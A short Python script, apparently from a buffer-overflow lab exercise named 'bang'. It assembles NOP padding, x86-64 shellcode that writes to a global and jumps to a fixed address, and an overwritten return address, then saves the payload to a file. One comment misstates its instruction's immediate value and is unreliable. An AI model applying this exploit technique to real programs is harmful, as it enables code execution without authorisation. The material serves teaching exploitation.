import sys

shellcode = b'\x48\xc7\xc2\x2d\x00\x00\x00'  # mov $0x404030,%rdx
shellcode += b'\x48\x89\x14\x25\x48\x40\x40\x00'  # mov %rdx,0x404048
shellcode += b'\x68\x9e\x11\x40\x00'  # push $0x40119e
shellcode += b'\xc3'  # ret

buf_addr = 0x7fffffffd940

buf_size = 32
padding_size = buf_size - len(shellcode)


payload = b'\x90' * padding_size
payload += shellcode
payload += b'\x90' * 8
payload += buf_addr.to_bytes(8, byteorder='little')  # 覆盖返回地址

with open(r'./payload/bang.bin', 'wb') as f:
    f.write(payload)

print("Payload written to bang.bin")